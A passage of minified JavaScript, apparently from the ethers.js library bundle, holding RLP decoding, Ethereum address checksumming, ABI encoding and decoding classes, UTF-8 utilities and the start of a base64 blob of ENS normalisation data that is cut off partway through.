if(t[e]>=192){const r=t[e]-192;return e+1+r>t.length&&Ri.throwError("data array too short",H.errors.BUFFER_OVERRUN,{}),RA(t,e,e+1,r)}else if(t[e]>=184){const r=t[e]-183;e+1+r>t.length&&Ri.throwError("data array too short",H.errors.BUFFER_OVERRUN,{});const n=PA(t,e+1,r);e+1+r+n>t.length&&Ri.throwError("data array too short",H.errors.BUFFER_OVERRUN,{});const i=we(t.slice(e+1+r,e+1+r+n));return{consumed:1+r+n,result:i}}else if(t[e]>=128){const r=t[e]-128;e+1+r>t.length&&Ri.throwError("data too short",H.errors.BUFFER_OVERRUN,{});const n=we(t.slice(e+1,e+1+r));return{consumed:1+r,result:n}}return{consumed:1,result:we(t[e])}}function Yy(t){const e=ve(t),r=Ex(e,0);return r.consumed!==e.length&&Ri.throwArgumentError("invalid rlp data","data",t),r.result}const IV="address/5.8.0",tc=new H(IV);function OA(t){Ye(t,20)||tc.throwArgumentError("invalid address","address",t),t=t.toLowerCase();const e=t.substring(2).split(""),r=new Uint8Array(40);for(let i=0;i<40;i++)r[i]=e[i].charCodeAt(0);const n=ve(fr(r));for(let i=0;i<40;i+=2)n[i>>1]>>4>=8&&(e[i]=e[i].toUpperCase()),(n[i>>1]&15)>=8&&(e[i+1]=e[i+1].toUpperCase());return"0x"+e.join("")}const xV=9007199254740991;function SV(t){return Math.log10?Math.log10(t):Math.log(t)/Math.LN10}const Jy={};for(let t=0;t<10;t++)Jy[String(t)]=String(t);for(let t=0;t<26;t++)Jy[String.fromCharCode(65+t)]=String(10+t);const kA=Math.floor(SV(xV));function NV(t){t=t.toUpperCase(),t=t.substring(4)+t.substring(0,2)+"00";let e=t.split("").map(n=>Jy[n]).join("");for(;e.length>=kA;){let n=e.substring(0,kA);e=parseInt(n,10)%97+e.substring(n.length)}let r=String(98-parseInt(e,10)%97);for(;r.length<2;)r="0"+r;return r}function Mr(t){let e=null;if(typeof t!="string"&&tc.throwArgumentError("invalid address","address",t),t.match(/^(0x)?[0-9a-fA-F]{40}$/))t.substring(0,2)!=="0x"&&(t="0x"+t),e=OA(t),t.match(/([A-F].*[a-f])|([a-f].*[A-F])/)&&e!==t&&tc.throwArgumentError("bad address checksum","address",t);else if(t.match(/^XE[0-9]{2}[0-9A-Za-z]{30,31}$/)){for(t.substring(2,4)!==NV(t)&&tc.throwArgumentError("bad icap checksum","address",t),e=cV(t.substring(4));e.length<40;)e="0"+e;e=OA("0x"+e)}else tc.throwArgumentError("invalid address","address",t);return e}function Ax(t){let e=null;try{e=Mr(t.from)}catch{tc.throwArgumentError("missing from address","transaction",t)}const r=Rc(ve(ne.from(t.nonce).toHexString()));return Mr(qr(fr(tp([e,r])),12))}class TV extends _s{constructor(e){super("address","address",e,!1)}defaultValue(){return"0x0000000000000000000000000000000000000000"}encode(e,r){try{r=Mr(r)}catch(n){this._throwError(n.message,r)}return e.writeValue(r)}decode(e){return Mr(Vt(e.readValue().toHexString(),20))}}class PV extends _s{constructor(e){super(e.name,e.type,void 0,e.dynamic),this.coder=e}defaultValue(){return this.coder.defaultValue()}encode(e,r){return this.coder.encode(e,r)}decode(e){return this.coder.decode(e)}}const rc=new H(yh);function _x(t,e,r){let n=null;if(Array.isArray(r))n=r;else if(r&&typeof r=="object"){let c={};n=e.map(u=>{const l=u.localName;return l||rc.throwError("cannot encode object for signature with missing names",H.errors.INVALID_ARGUMENT,{argument:"values",coder:u,value:r}),c[l]&&rc.throwError("cannot encode object for signature with duplicate names",H.errors.INVALID_ARGUMENT,{argument:"values",coder:u,value:r}),c[l]=!0,r[l]})}else rc.throwArgumentError("invalid tuple value","tuple",r);e.length!==n.length&&rc.throwArgumentError("types/value length mismatch","tuple",r);let i=new B0(t.wordSize),s=new B0(t.wordSize),o=[];e.forEach((c,u)=>{let l=n[u];if(c.dynamic){let h=s.length;c.encode(s,l);let d=i.writeUpdatableValue();o.push(g=>{d(g+h)})}else c.encode(i,l)}),o.forEach(c=>{c(i.length)});let a=t.appendWriter(i);return a+=t.appendWriter(s),a}function Cx(t,e){let r=[],n=t.subReader(0);e.forEach(s=>{let o=null;if(s.dynamic){let a=t.readValue(),c=n.subReader(a.toNumber());try{o=s.decode(c)}catch(u){if(u.code===H.errors.BUFFER_OVERRUN)throw u;o=u,o.baseType=s.name,o.name=s.localName,o.type=s.type}}else try{o=s.decode(t)}catch(a){if(a.code===H.errors.BUFFER_OVERRUN)throw a;o=a,o.baseType=s.name,o.name=s.localName,o.type=s.type}o!=null&&r.push(o)});const i=e.reduce((s,o)=>{const a=o.localName;return a&&(s[a]||(s[a]=0),s[a]++),s},{});e.forEach((s,o)=>{let a=s.localName;if(!a||i[a]!==1||(a==="length"&&(a="_length"),r[a]!=null))return;const c=r[o];c instanceof Error?Object.defineProperty(r,a,{enumerable:!0,get:()=>{throw c}}):r[a]=c});for(let s=0;s<r.length;s++){const o=r[s];o instanceof Error&&Object.defineProperty(r,s,{enumerable:!0,get:()=>{throw o}})}return Object.freeze(r)}class RV extends _s{constructor(e,r,n){const i=e.type+"["+(r>=0?r:"")+"]",s=r===-1||e.dynamic;super("array",i,n,s),this.coder=e,this.length=r}defaultValue(){const e=this.coder.defaultValue(),r=[];for(let n=0;n<this.length;n++)r.push(e);return r}encode(e,r){Array.isArray(r)||this._throwError("expected array value",r);let n=this.length;n===-1&&(n=r.length,e.writeValue(r.length)),rc.checkArgumentCount(r.length,n,"coder array"+(this.localName?" "+this.localName:""));let i=[];for(let s=0;s<r.length;s++)i.push(this.coder);return _x(e,i,r)}decode(e){let r=this.length;r===-1&&(r=e.readValue().toNumber(),r*32>e._data.length&&rc.throwError("insufficient data length",H.errors.BUFFER_OVERRUN,{length:e._data.length,count:r}));let n=[];for(let i=0;i<r;i++)n.push(new PV(this.coder));return e.coerce(this.name,Cx(e,n))}}class OV extends _s{constructor(e){super("bool","bool",e,!1)}defaultValue(){return!1}encode(e,r){return e.writeValue(r?1:0)}decode(e){return e.coerce(this.type,!e.readValue().isZero())}}class Ix extends _s{constructor(e,r){super(e,e,r,!0)}defaultValue(){return"0x"}encode(e,r){r=ve(r);let n=e.writeValue(r.length);return n+=e.writeBytes(r),n}decode(e){return e.readBytes(e.readValue().toNumber(),!0)}}class kV extends Ix{constructor(e){super("bytes",e)}decode(e){return e.coerce(this.name,we(super.decode(e)))}}class DV extends _s{constructor(e,r){let n="bytes"+String(e);super(n,n,r,!1),this.size=e}defaultValue(){return"0x0000000000000000000000000000000000000000000000000000000000000000".substring(0,2+this.size*2)}encode(e,r){let n=ve(r);return n.length!==this.size&&this._throwError("incorrect data length",r),e.writeBytes(n)}decode(e){return e.coerce(this.name,we(e.readBytes(this.size)))}}class MV extends _s{constructor(e){super("null","",e,!1)}defaultValue(){return null}encode(e,r){return r!=null&&this._throwError("not null",r),e.writeBytes([])}decode(e){return e.readBytes(0),e.coerce(this.name,null)}}const BV="0x0000000000000000000000000000000000000000",UV=ne.from(-1),xx=ne.from(0),$V=ne.from(1),Sx=ne.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),LV="0x0000000000000000000000000000000000000000000000000000000000000000";class FV extends _s{constructor(e,r,n){const i=(r?"int":"uint")+e*8;super(i,i,n,!1),this.size=e,this.signed=r}defaultValue(){return 0}encode(e,r){let n=ne.from(r),i=Sx.mask(e.wordSize*8);if(this.signed){let s=i.mask(this.size*8-1);(n.gt(s)||n.lt(s.add($V).mul(UV)))&&this._throwError("value out-of-bounds",r)}else(n.lt(xx)||n.gt(i.mask(this.size*8)))&&this._throwError("value out-of-bounds",r);return n=n.toTwos(this.size*8).mask(this.size*8),this.signed&&(n=n.fromTwos(this.size*8).toTwos(8*e.wordSize)),e.writeValue(n)}decode(e){let r=e.readValue().mask(this.size*8);return this.signed&&(r=r.fromTwos(this.size*8)),e.coerce(this.name,r)}}const jV="strings/5.8.0",Nx=new H(jV);var ql;(function(t){t.current="",t.NFC="NFC",t.NFD="NFD",t.NFKC="NFKC",t.NFKD="NFKD"})(ql||(ql={}));var xn;(function(t){t.UNEXPECTED_CONTINUE="unexpected continuation byte",t.BAD_PREFIX="bad codepoint prefix",t.OVERRUN="string overrun",t.MISSING_CONTINUE="missing continuation byte",t.OUT_OF_RANGE="out of UTF-8 range",t.UTF16_SURROGATE="UTF-16 surrogate",t.OVERLONG="overlong representation"})(xn||(xn={}));function qV(t,e,r,n,i){return Nx.throwArgumentError(`invalid codepoint at offset ${e}; ${t}`,"bytes",r)}function Tx(t,e,r,n,i){if(t===xn.BAD_PREFIX||t===xn.UNEXPECTED_CONTINUE){let s=0;for(let o=e+1;o<r.length&&r[o]>>6===2;o++)s++;return s}return t===xn.OVERRUN?r.length-e-1:0}function zV(t,e,r,n,i){return t===xn.OVERLONG?(n.push(i),0):(n.push(65533),Tx(t,e,r))}const HV=Object.freeze({error:qV,ignore:Tx,replace:zV});function Px(t,e){e==null&&(e=HV.error),t=ve(t);const r=[];let n=0;for(;n<t.length;){const i=t[n++];if(i>>7===0){r.push(i);continue}let s=null,o=null;if((i&224)===192)s=1,o=127;else if((i&240)===224)s=2,o=2047;else if((i&248)===240)s=3,o=65535;else{(i&192)===128?n+=e(xn.UNEXPECTED_CONTINUE,n-1,t,r):n+=e(xn.BAD_PREFIX,n-1,t,r);continue}if(n-1+s>=t.length){n+=e(xn.OVERRUN,n-1,t,r);continue}let a=i&(1<<8-s-1)-1;for(let c=0;c<s;c++){let u=t[n];if((u&192)!=128){n+=e(xn.MISSING_CONTINUE,n,t,r),a=null;break}a=a<<6|u&63,n++}if(a!==null){if(a>1114111){n+=e(xn.OUT_OF_RANGE,n-1-s,t,r,a);continue}if(a>=55296&&a<=57343){n+=e(xn.UTF16_SURROGATE,n-1-s,t,r,a);continue}if(a<=o){n+=e(xn.OVERLONG,n-1-s,t,r,a);continue}r.push(a)}}return r}function Gi(t,e=ql.current){e!=ql.current&&(Nx.checkNormalize(),t=t.normalize(e));let r=[];for(let n=0;n<t.length;n++){const i=t.charCodeAt(n);if(i<128)r.push(i);else if(i<2048)r.push(i>>6|192),r.push(i&63|128);else if((i&64512)==55296){n++;const s=t.charCodeAt(n);if(n>=t.length||(s&64512)!==56320)throw new Error("invalid utf-8 string");const o=65536+((i&1023)<<10)+(s&1023);r.push(o>>18|240),r.push(o>>12&63|128),r.push(o>>6&63|128),r.push(o&63|128)}else r.push(i>>12|224),r.push(i>>6&63|128),r.push(i&63|128)}return ve(r)}function WV(t){return t.map(e=>e<=65535?String.fromCharCode(e):(e-=65536,String.fromCharCode((e>>10&1023)+55296,(e&1023)+56320))).join("")}function wh(t,e){return WV(Px(t,e))}function GV(t,e=ql.current){return Px(Gi(t,e))}class VV extends Ix{constructor(e){super("string",e)}defaultValue(){return""}encode(e,r){return super.encode(e,Gi(r))}decode(e){return wh(super.decode(e))}}class Zh extends _s{constructor(e,r){let n=!1;const i=[];e.forEach(o=>{o.dynamic&&(n=!0),i.push(o.type)});const s="tuple("+i.join(",")+")";super("tuple",s,r,n),this.coders=e}defaultValue(){const e=[];this.coders.forEach(n=>{e.push(n.defaultValue())});const r=this.coders.reduce((n,i)=>{const s=i.localName;return s&&(n[s]||(n[s]=0),n[s]++),n},{});return this.coders.forEach((n,i)=>{let s=n.localName;!s||r[s]!==1||(s==="length"&&(s="_length"),e[s]==null&&(e[s]=e[i]))}),Object.freeze(e)}encode(e,r){return _x(e,this.coders,r)}decode(e){return e.coerce(this.name,Cx(e,this.coders))}}const Xh=new H(yh),KV=new RegExp(/^bytes([0-9]*)$/),QV=new RegExp(/^(u?int)([0-9]*)$/);class YV{constructor(e){X(this,"coerceFunc",e||null)}_getCoder(e){switch(e.baseType){case"address":return new TV(e.name);case"bool":return new OV(e.name);case"string":return new VV(e.name);case"bytes":return new kV(e.name);case"array":return new RV(this._getCoder(e.arrayChildren),e.arrayLength,e.name);case"tuple":return new Zh((e.components||[]).map(n=>this._getCoder(n)),e.name);case"":return new MV(e.name)}let r=e.type.match(QV);if(r){let n=parseInt(r[2]||"256");return(n===0||n>256||n%8!==0)&&Xh.throwArgumentError("invalid "+r[1]+" bit length","param",e),new FV(n/8,r[1]==="int",e.name)}if(r=e.type.match(KV),r){let n=parseInt(r[1]);return(n===0||n>32)&&Xh.throwArgumentError("invalid bytes length","param",e),new DV(n,e.name)}return Xh.throwArgumentError("invalid type","type",e.type)}_getWordSize(){return 32}_getReader(e,r){return new df(e,this._getWordSize(),this.coerceFunc,r)}_getWriter(){return new B0(this._getWordSize())}getDefaultValue(e){const r=e.map(i=>this._getCoder(br.from(i)));return new Zh(r,"_").defaultValue()}encode(e,r){e.length!==r.length&&Xh.throwError("types/values length mismatch",H.errors.INVALID_ARGUMENT,{count:{types:e.length,values:r.length},value:{types:e,values:r}});const n=e.map(o=>this._getCoder(br.from(o))),i=new Zh(n,"_"),s=this._getWriter();return i.encode(s,r),s.data}decode(e,r,n){const i=e.map(o=>this._getCoder(br.from(o)));return new Zh(i,"_").decode(this._getReader(ve(r),n))}}const JV=new YV;function nc(t){return fr(Gi(t))}const Rx="hash/5.8.0";function Ox(t){t=atob(t);const e=[];for(let r=0;r<t.length;r++)e.push(t.charCodeAt(r));return ve(e)}function kx(t){t=ve(t);let e="";for(let r=0;r<t.length;r++)e+=String.fromCharCode(t[r]);return btoa(e)}function Dx(t,e){e==null&&(e=1);const r=[],n=r.forEach,i=function(s,o){n.call(s,function(a){o>0&&Array.isArray(a)?i(a,o-1):r.push(a)})};return i(t,e),r}function ZV(t){const e={};for(let r=0;r<t.length;r++){const n=t[r];e[n[0]]=n[1]}return e}function XV(t){let e=0;function r(){return t[e++]<<8|t[e++]}let n=r(),i=1,s=[0,1];for(let S=1;S<n;S++)s.push(i+=r());let o=r(),a=e;e+=o;let c=0,u=0;function l(){return c==0&&(u=u<<8|t[e++],c=8),u>>--c&1}const h=31,d=Math.pow(2,h),g=d>>>1,y=g>>1,m=d-1;let b=0;for(let S=0;S<h;S++)b=b<<1|l();let A=[],_=0,T=d;for(;;){let S=Math.floor(((b-_+1)*i-1)/T),C=0,O=n;for(;O-C>1;){let F=C+O>>>1;S<s[F]?O=F:C=F}if(C==0)break;A.push(C);let $=_+Math.floor(T*s[C]/i),D=_+Math.floor(T*s[C+1]/i)-1;for(;(($^D)&g)==0;)b=b<<1&m|l(),$=$<<1&m,D=D<<1&m|1;for(;$&~D&y;)b=b&g|b<<1&m>>>1|l(),$=$<<1^g,D=(D^g)<<1|g|1;_=$,T=1+D-$}let P=n-4;return A.map(S=>{switch(S-P){case 3:return P+65792+(t[a++]<<16|t[a++]<<8|t[a++]);case 2:return P+256+(t[a++]<<8|t[a++]);case 1:return P+t[a++];default:return S-1}})}function eK(t){let e=0;return()=>t[e++]}function tK(t){return eK(XV(t))}function rK(t){return t&1?~t>>1:t>>1}function nK(t,e){let r=Array(t);for(let n=0;n<t;n++)r[n]=1+e();return r}function DA(t,e){let r=Array(t);for(let n=0,i=-1;n<t;n++)r[n]=i+=1+e();return r}function iK(t,e){let r=Array(t);for(let n=0,i=0;n<t;n++)r[n]=i+=rK(e());return r}function ff(t,e){let r=DA(t(),t),n=t(),i=DA(n,t),s=nK(n,t);for(let o=0;o<n;o++)for(let a=0;a<s[o];a++)r.push(i[o]+a);return e?r.map(o=>e[o]):r}function sK(t){let e=[];for(;;){let r=t();if(r==0)break;e.push(aK(r,t))}for(;;){let r=t()-1;if(r<0)break;e.push(cK(r,t))}return ZV(Dx(e))}function oK(t){let e=[];for(;;){let r=t();if(r==0)break;e.push(r)}return e}function Mx(t,e,r){let n=Array(t).fill(void 0).map(()=>[]);for(let i=0;i<e;i++)iK(t,r).forEach((s,o)=>n[o].push(s));return n}function aK(t,e){let r=1+e(),n=e(),i=oK(e),s=Mx(i.length,1+t,e);return Dx(s.map((o,a)=>{const c=o[0],u=o.slice(1);return Array(i[a]).fill(void 0).map((l,h)=>{let d=h*n;return[c+h*r,u.map(g=>g+d)]})}))}function cK(t,e){let r=1+e();return Mx(r,1+t,e).map(i=>[i[0],i.slice(1)])}function uK(t){let e=ff(t).sort((n,i)=>n-i);return r();function r(){let n=[];for(;;){let u=ff(t,e);if(u.length==0)break;n.push({set:new Set(u),node:r()})}n.sort((u,l)=>l.set.size-u.set.size);let i=t(),s=i%3;i=i/3|0;let o=!!(i&1);i>>=1;let a=i==1,c=i==2;return{branches:n,valid:s,fe0f:o,save:a,check:c}}}function lK(){return tK(Ox("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